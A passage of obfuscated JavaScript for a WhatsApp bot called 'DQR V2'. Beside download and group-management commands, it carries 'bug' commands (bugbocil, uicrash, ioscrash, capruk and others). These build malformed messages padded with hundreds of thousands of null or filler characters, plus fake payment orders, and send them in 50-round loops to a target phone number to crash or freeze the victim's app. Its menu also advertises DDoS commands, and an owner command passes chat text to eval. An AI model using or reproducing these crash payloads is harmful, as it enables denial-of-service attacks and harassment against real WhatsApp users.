            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function f24(p217, p218, p219) {
      let v726 = await generateWAMessageFromContent(p217, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Sent",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ModsExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@Akmal.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(p219) + "\",\"screen_0_TextInput_1\":\"∗⿻ 🔗⃟𝐃𝐐𝐑 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴▾ ༑̴⟆̊⿻ \",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }), {
        userJid: p217,
        quoted: p218
      });
    }
    async function f25(p220) {
      var vGenerateWAMessageFromContent10 = generateWAMessageFromContent(p220, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + _0xde4be7 + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      p147.relayMessage(p220, vGenerateWAMessageFromContent10.message, {
        messageId: vGenerateWAMessageFromContent10.key.id
      });
    }
    async function f26(p221) {
      var vGenerateWAMessageFromContent11 = generateWAMessageFromContent(p221, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "𝐃𝐐𝐑 𝐍𝐄𝐖 𝐄𝐑𝐀" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "Undangan Admin Bokep",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: p221
      });
      await p147.relayMessage(p221, vGenerateWAMessageFromContent11.message, {
        participant: {
          jid: p221
        },
        messageId: vGenerateWAMessageFromContent11.key.id
      });
    }
    const v727 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(p148.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs3.readFileSync("./zeno/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐃𝐐𝐑 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const v728 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(p148.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        listResponseMessage: {
          title: "∗⿻ 🔗⃟𝐃𝐐𝐑 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴▾ ༑̴⟆̊⿻ "
        }
      }
    };
    const v729 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(p148.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs3.readFileSync("./zeno/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐃𝐐𝐑 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    let v730 = [];
    for (let v731 of v682) {
      v730.push({
        displayName: await p147.getName(v731 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await p147.getName(v731 + "@s.whatsapp.net")) + "\n\nFN:dray\n\nitem1.TEL;waid=" + v731 + ":" + v731 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET:drayoffc@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:bit.ly/Drayotomatis\n\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;DrayXD Official;;;;\n\nitem4.X-ABLabel:Session 1\n\nEND:VCARD"
      });
    }
    if (v649 && p148.msg.fileSha256 && p148.msg.fileSha256.toString("base64") in global.db.data.sticker) {
      let v732 = global.db.data.sticker[p148.msg.fileSha256.toString("base64")];
      let {
        text: _0x3a5d1d,
        mentionedJid: _0x3d692e
      } = v732;
      let v733 = await generateWAMessage(v650, {
        text: _0x3a5d1d,
        mentions: _0x3d692e
      }, {
        userJid: p147.user.id,
        quoted: p148.quoted && p148.quoted.fakeObj
      });
      v733.key.fromMe = areJidsSameUser(p148.sender, p147.user.id);
      v733.key.id = p148.key.id;
      v733.pushName = p148.pushName;
      if (p148.isGroup) {
        v733.participant = p148.sender;
      }
      let v734 = {
        ...p149,
        messages: [proto.WebMessageInfo.fromObject(v733)],
        type: "append"
      };
      p147.ev.emit("messages.upsert", v734);
    }
    if (v625.startsWith("!")) {
      try {
        return vF9(JSON.stringify(eval("" + v643.join(" ")), null, "\t"));
      } catch (_0x266127) {
        vF9(_0x266127);
      }
    }
    if (v694) {
      if (v625.match("chat.whatsapp.com")) {
        p148.reply("*「 ANTI LINK 」*\n\nLink grup detected, maaf kamu akan di kick !");
        if (!v660) {
          return p148.reply("Upsss... gajadi, bot bukan admin");
        }
        let v735 = "https://chat.whatsapp.com/" + (await p147.groupInviteCode(p148.chat));
        let v736 = new RegExp(v735, "i");
        let v737 = v736.test(p148.text);
        if (v737) {
          return p148.reply("Upsss... gak jadi, untung link gc sendiri");
        }
        if (v661) {
          return p148.reply("Upsss... gak jadi, kasian adminnya klo di kick");
        }
        if (v700) {
          return p148.reply("Upsss... gak jadi, kasian owner ku klo di kick");
        }
        if (p148.key.fromMe) {
          return p148.reply("Upsss... gak jadi, kasian owner ku klo di kick");
        }
        await p147.sendMessage(p148.chat, {
          delete: {
            remoteJid: p148.chat,
            fromMe: false,
            id: p148.key.id,
            participant: p148.key.participant
          }
        });
        p147.groupParticipantsUpdate(p148.chat, [p148.sender], "remove");
      }
    }
    if (v695) {
      if (v625.match("chat.whatsapp.com")) {
        if (!v660) {
          return;
        }
        let v738 = "https://chat.whatsapp.com/" + (await p147.groupInviteCode(p148.chat));
        let v739 = new RegExp(v738, "i");
        let v740 = v739.test(p148.text);
        if (v740) {
          return;
        }
        if (v661) {
          return;
        }
        if (v645) {
          return;
        }
        if (p148.key.fromMe) {
          return;
        }
        await p147.sendMessage(p148.chat, {
          delete: {
            remoteJid: p148.chat,
            fromMe: false,
            id: p148.key.id,
            participant: p148.key.participant
          }
        });
      }
    }
    if (v696) {
      if (v625.match("chat.whatsapp.com")) {
        p148.reply(autojpmm + "\n");
        let v741 = "https://chat.whatsapp.com/";
        let v742 = new RegExp(v741, "i");
        let v743 = v742.test(p148.text);
        await p147.sendMessage(p148.chat, {
          delete: {
            remoteJid: p148.chat,
            fromMe: false,
            id: p148.key.id,
            participant: p148.key.participant
          }
        });
      }
    }
    switch (v642) {
      case "menu":
        {
          await p147.sendMessage(p148.chat, {
            react: {
              text: "☠️",
              key: p148.key
            }
          });
          await p147.sendMessage(p148.chat, {
            react: {
              text: "☠️",
              key: p148.key
            }
          });
          wek = `
┏───────────────┓
┋ [ *\`DQR V2\`* ]
┋ *Version*  : *V2*
┋ *Expired* : 7h 13d
┋ *CPU*.   : 900%
┋ *SPEED* : 0,00001MS
┗───────────────┛

*⚠️Description : use it wisely, don't spam!*͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
┏─『 BUG MENU 』──🩸⃟༑⌁
│
│${global.simbol} ${v626} bugbocil 62xxxx <𝙳𝙴𝙻𝙰𝚈 𝙼𝙰𝙺𝙴𝚁>
│${global.simbol} ${v626} dxlaw-version 62xxxx
│${global.simbol} ${v626} dqrbetav1 62xxxx
│${global.simbol} ${v626} dqrbetav2 62xxxx
│${global.simbol} ${v626} dqrbetav3 62xxxx
│${global.simbol} ${v626} uicrash 62xxxx
│${global.simbol} ${v626} ioscrash 62xxxx
│${global.simbol} ${v626} homecrash 62xxxx
│${global.simbol} ${v626} repeat 62xxxx
│${global.simbol} ${v626} capruk 62xxxx <tidak disarankan ☠️>
│${global.simbol} ${v626} addcase
╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼>>

┏─『 DDOS MENU 』──🩸⃟༑⌁
│${global.simbol} ${v626} dos
│${global.simbol} ${v626} ddos
│${global.simbol} ${v626} floads
│${global.simbol} ${v626} ua
│${global.simbol} ${v626} xchrome
│${global.simbol} ${v626} tls
│${global.simbol} ${v626} tlsv2
│${global.simbol} ${v626} tlsbypass
│${global.simbol} ${v626} tls-vip
│${global.simbol} ${v626} xc
╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼>>

┏─『 DOWNLOAD MENU 』──🩸⃟༑⌁
│${global.simbol} ${v626} ytmp4
│${global.simbol} ${v626} ytmp3
│${global.simbol} ${v626} dtiktok
│${global.simbol} ${v626} mediafire
│${global.simbol} ${v626} playmp4
│${global.simbol} ${v626} playmp3
│${global.simbol} ${v626} spotify
╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼>>

┏─『 ATMIN MENU 』──🩸⃟༑⌁
│${global.simbol} ${v626} addmurbug 62xxxx
│${global.simbol} ${v626} dellmurbug 62xxxx
│${global.simbol} ${v626} addgcmurbug
│${global.simbol} ${v626} dellgcmurbug
╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼>>

┏─『 UBAH MENU 』──🩸⃟༑⌁
│${global.simbol} ${v626} owner
│${global.simbol} ${v626} qc
│${global.simbol} ${v626} sticker
│${global.simbol} ${v626} telegraph
│${global.simbol} ${v626} toimg
│${global.simbol} ${v626} remini
│${global.simbol} ${v626} hd
│${global.simbol} ${v626} pinterest
│${global.simbol} ${v626} emojimix
╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼>>

┏─『 GRUP MENU 』──🩸⃟༑⌁
│${global.simbol} ${v626} akses
│${global.simbol} ${v626} delakses
│${global.simbol} ${v626} hidetag
│${global.simbol} ${v626} tagall
│${global.simbol} ${v626} promote
│${global.simbol} ${v626} demote
│${global.simbol} ${v626} antilink
│${global.simbol} ${v626} antilink2
│${global.simbol} ${v626} open
│${global.simbol} ${v626} close
│${global.simbol} ${v626} jeda
│${global.simbol} ${v626} welcome
│${global.simbol} ${v626} left
│${global.simbol} ${v626} setwelcome
│${global.simbol} ${v626} changewelcome
│${global.simbol} ${v626} delsetwelcome
│${global.simbol} ${v626} setleft
│${global.simbol} ${v626} changeleft
│${global.simbol} ${v626} delsetleft
│${global.simbol} ${v626} delete
│${global.simbol} ${v626} kick
│${global.simbol} ${v626} setnamagc
│${global.simbol} ${v626} linkgc
│${global.simbol} ${v626} setlinkgc
│${global.simbol} ${v626} setdesk
╰╼╼╼╼➻ </>𝐄𝐧𝐝</>
`;
          p147.sendMessage(p148.chat, {
          video: dray,
            gifPlayback: false,
            caption: wek,
            contextInfo: {
              externalAdReply: {
                title: "𝐃𝐐𝐑",
                body: "© Dqr ",
                thumbnailUrl: "https://a.top4top.io/p_324220e9m0.png",
                sourceUrl: "https://whatsapp.com/channel/bjjkkk",
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          }, {
            quoted: p148
          });
        }
        await sleep(1500);
        await p147.sendMessage(p148.chat, {
          audio: v684,
          mimetype: "audio/mp4",
          ptt: true
        }, {
          quoted: p148
        });
        break;
      case "mediafire":
        {
          if (!v700) {
            return vF9("Ngapain ? Fitur Ini Buat Bang 𝐃𝐐𝐑");
          }
          if (v643.length == 0) {
            return vF9("Link Nya Tuan?");
          }
          if (!isUrl(v643[0]) && !v643[0].includes("mediafire.com")) {
            return vF9("The link you provided is invalid");
          }
          const {
            mediafireDl: _0x9e7d24
          } = require("./database/mediafire.js");
          const v744 = await _0x9e7d24(v646);
          if (v744[0].size.split("MB")[0] >= 100) {
            return vF9("Oops, the file is too big...");
          }
          const v745 = "*MEDIAFIRE DOWNLOADER*\n\n*❖ Name* : " + v744[0].nama + "\n*❖ Size* : " + v744[0].size + "\n*❖ Mime* : " + v744[0].mime + "\n*❖ Link* : " + v744[0].link;
          vF9("" + v745);
          p147.sendMessage(p148.chat, {
            document: {
              url: v744[0].link
            },
            fileName: v744[0].nama,
            mimetype: v744[0].mime
          }, {
            quoted: p148
          });
        }
        break;
      case "jpmfoto":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v646) {
            return vF9("*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n" + (v626 + v642) + " teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik");
          }
          let v746 = await p147.groupFetchAllParticipating();
          let v747 = Object.entries(v746).slice(0).map(p222 => p222[1]);
          let v748 = v747.map(p223 => p223.id);
          for (let v749 of v748) {
            if (/image/.test(v648)) {
              media = await p147.downloadAndSaveMediaMessage(v647);
              mem = await uptotelegra(media);
              await p147.sendMessage(v749, {
                image: {
                  url: mem
                },
                caption: v646.split("|")[0]
              });
              await sleep(v646.split("|")[1]);
            } else {
              await p147.sendMessage(v749, {
                text: v646.split("|")[0]
              });
              await sleep(v646.split("|")[1]);
            }
          }
          vF9("Sukses Mengirim Broadcast Ke " + v748.length + " Group");
        }
        break;
      case "playmp4":
        {
          if (!v697 && !v700) {
            return vF9("lu siapa?");
          }
          if (!q) {
            return vF9("Enter the Song Title!");
          }
          vF9("Tunggu Kak sedang Zeno Proses");
          let v750 = await ytPlayMp4(q);
          p147.sendMessage(v650, {
            video: {
              url: v750.url[0]
            },
            caption: "Youtube Play Video\n\nTitle: " + v750.title + "\nChannel: " + v750.channel + "\nViews: " + v750.views
          }, {
            quoted: p148
          });
        }
        break;
      case "playmp3":
        {
          if (!v697 && !v700) {
            return vF9("lu siapa?");
          }
          if (!q) {
            return vF9("Enter the Song Title!");
          }
          vF9("Tunggu Kak sedang 𝐃𝐐𝐑 Proses");
          let v751 = await ytPlayMp3(q);
          p147.sendMessage(v650, {
            audio: {
              url: v751.url[0]
            },
            mimetype: "audio/mp4",
            ptt: false
          }, {
            quoted: p148
          });
        }
        break;
      case "ytmp4":
        {
          if (!v697 && !v700) {
            return vF9("lu siapa?");
          }
          if (!q) {
            return vF9("Link Not Found !");
          }
          vF9("Tunggu Kak sedang Zeno Proses");
          let v752 = await ytDonlodMp4(q);
          p147.sendMessage(v650, {
            video: {
              url: v752.url[0]
            },
            caption: "Youtube Download Video\n\nJudul: " + v752.title + "\nChannel: " + v752.channel + "\nUpload: " + v752.published + "\nViews: " + v752.views
          }, {
            quoted: p148
          });
        }
        break;
      case "ytmp3":
        {
          if (!v697 && !v700) {
            return vF9("lu siapa?");
          }
          if (!q) {
            return vF9("Link Not Found !");
          }
          vF9("Tunggu Kak sedang 𝐃𝐐𝐑 Proses");
          let v753 = await ytDonlodMp3(q);
          p147.sendMessage(v650, {
            audio: {
              url: v753.url[0]
            },
            mimetype: "audio/mp4",
            ptt: false
          }, {
            quoted: p148
          });
        }
        break;
      case "dtiktok":
        {
          if (!v700) {
            return p148.reply("*khusus Premium*");
          }
          if (!v646) {
            return p148.reply("Example : " + (v626 + v642) + " link");
          }
          if (!q.includes("tiktok")) {
            return p148.reply("Link Invalid!!");
          }
          await vF9(mess.wait);
          require("./database/tiktok").Tiktok(q).then(p224 => {
            p147.sendMessage(p148.chat, {
              video: {
                url: p224.nowm
              }
            }, {
              quoted: p148
            });
          });
        }
        break;
      case "joingc":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!q) {
            return vF9("Kirim perintah " + (v626 + v642) + " *_Link Grup Nya Tuan?🤔_*");
          }
          var v754 = q.split("https://chat.whatsapp.com/")[1];
          var v755 = await p147.groupAcceptInvite(v754);
          p148.reply("*Sukses Join Ke Grup Tuan✅*");
        }
        break;
      case "spotify":
        {
          if (!v646) {
            return vF9("Contoh : " + (v626 + v642) + " dandelion");
          }
          let v756 = await fetchJson("https://api.junn4.my.id/search/spotify?query=" + v646);
          const v757 = "乂 *S P O T I F Y*\n\n*Title*: " + v756.data[0].title + "\n*Duration*: " + v756.data[0].duration + "\n*Popular*: " + v756.data[0].popularity + "\n*Url*: " + v756.data[0].url + "\n";
          p147.sendMessage(p148.chat, {
            text: v757,
            contextInfo: {
              externalAdReply: {
                title: "𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘",
                body: "© DrayXD",
                showAdAttribution: true,
                mediaType: 1,
                sourceUrl: "",
                thumbnailUrl: "https://img100.pixhost.to/images/53/532428061_skyzopedia.jpg",
                renderLargerThumbnail: true
              }
            }
          }, {
            quoted: v709
          });
          const v758 = await fetchJson("https://api.junn4.my.id/download/spotify?url=" + v756.data[0].url);
          const v759 = v758.data.download;
          p147.sendMessage(p148.chat, {
            audio: {
              url: v759
            },
            mimetype: "audio/mpeg",
            contextInfo: {
              externalAdReply: {
                title: "𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘",
                body: "",
                thumbnailUrl: "https://img100.pixhost.to/images/53/532428061_skyzopedia.jpg",
                sourceUrl: v705,
                mediaType: 1,
                showAdAttribution: true,
                renderLargerThumbnail: true
              }
            }
          }, {
            quoted: v709
          });
        }
        break;
      case "delcase":
        {
          if (!v645) {
            return vF9("*Access Denied ❌*\n\n*Owners only*");
          }
          if (!q) {
            return vF9("*Masukan nama case yang akan di hapus*");
          }
          f16("./dray1922.js", q);
          vF9("*Dellcase Successfully*\n\n© Dellcase By Velzdev");
        }
        break;
      case "addcase":
        {
          if (!v700) {
            return vF9("lu sapa asu");
          }
          if (!v646) {
            return vF9("Mana case nya");
          }
          const fs4 = require("fs");
          const v760 = "drayyy1922.js";
          const vV646 = v646;
          fs4.readFile(v760, "utf8", (p225, p226) => {
            if (p225) {
              console.error("Terjadi kesalahan saat membaca file:", p225);
              return;
            }
            const v761 = p226.indexOf("case 'addcase':");
            if (v761 !== -1) {
              const v762 = p226.slice(0, v761) + "\n" + vV646 + "\n" + p226.slice(v761);
              fs4.writeFile(v760, v762, "utf8", p227 => {
                if (p227) {
                  vF9("Terjadi kesalahan saat menulis file:", p227);
                } else {
                  vF9("Case baru berhasil ditambahkan.");
                }
              });
            } else {
              vF9("Tidak dapat menambahkan case dalam file.");
            }
          });
        }
        break;
      case "bugbocil":
        if (!v697 && !v700 && !v699) {
          return vF9(mess.only.premium);
        }
        if (!q) {
          return vF9("Example: " + (v626 + v642) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF9(v714);
        for (let v763 = 0; v763 < 50; v763++) {
          await _0x1c309b(p147, target, "p", 1020000, ptcp = true);
          await f21(target, v725);
          await sleep(1500);
          await f21(target, v725);
          await _0x413d51(p147, target, v725);
          await sleep(1500);
          await f22(target, v725);
          await _0x2ce83d(p147, target, v725);
        }
        await sleep(1500);
        break;
      case "uicrash":
      case "ioscrash":
      case "homedelay":
        if (!v697 && !v700 && !v699) {
          return vF9(mess.only.premium);
        }
        if (!q) {
          return vF9("Example: " + (v626 + v642) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF9(v715);
        for (let v764 = 0; v764 < 50; v764++) {
          await _0x1c309b(p147, target, "p", 1020000, ptcp = true);
          await sleep(2000);
          await f20(target, ptcp = true);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f19(target, v729);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f19(target, v729);
          await f18(target, v719);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f18(target, v725);
          await f21(target, v725);
          await f21(target, v725);
          await sleep(2000);
          await _0x413d51(p147, target, v725);
          await f19(target, v725);
          await sleep(2000);
          await f22(target, v725);
          await sleep(2000);
          await _0x2ce83d(p147, target, v725);
          await f20(target, ptcp = true);
        }
        await sleep(1500);
        break;
      case "dqrbetav1":
      case "dqrbetav2":
      case "dqrbetav3":
        if (!v697 && !v700 && !v699) {
          return vF9(mess.only.premium);
        }
        if (!q) {
          return vF9("Example: " + (v626 + v642) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF9(v716);
        for (let v765 = 0; v765 < 50; v765++) {
          await f20(target, "p", 1020000, ptcp = true);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f20(target, "p", 1020000, ptcp = true);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await f18(target, v719);
          await sleep(2000);
          await f19(target, v729);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f19(target, v729);
          await f18(target, v719);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f20(target, ptcp = true);
          await sleep(2000);
        }
        break;
      case "repeat":
        if (!v697 && !v700) {
          return vF9(mess.only.owner);
        }
        if (!v652) {
          return vF9("Khusus private chat");
        }
        vF9(v716);
        for (let v766 = 0; v766 < 50; v766++) {
          await f20("p", 1020000, ptcp = true);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f19(v729);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
        }
        break;
        case "dxlaw-version":
         if (!v697 && !v700 && !v699) {
          return vF9(mess.only.premium);
        }
        if (!q) {
          return vF9("Example: " + (v626 + v642) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF9(v716);
        for (let v765 = 0; v765 < 50; v765++) {
          await f20(target, "p", 1020000, ptcp = true);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f20(target, "p", 1020000, ptcp = true);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await f18(target, v719);
          await sleep(2000);
          await f19(target, v729);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f19(target, v729);
          await f18(target, v719);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f19(target, v729);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f19(target, v729);
          await f18(target, v719);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f19(target, v729);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f19(target, v729);
          await f18(target, v719);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f19(target, v729);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f19(target, v729);
          await f18(target, v719);
          await sleep(2000);
          await f17(target, v725);
          await f20(target, ptcp = true);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
        }
        break;
        case "capruk":
         if (!v697 && !v700 && !v699) {
          return vF9(mess.only.premium);
        }
        if (!q) {
          return vF9("Example: " + (v626 + v642) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF9(v716);
        for (let v765 = 0; v765 < 50; v765++) {
          await f20(target, "p", 1020000, ptcp = true);
          await f18(target, v719);
          await f20(target, ptcp = true);
          await f20(target, ptcp = true);
          await sleep(2000);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
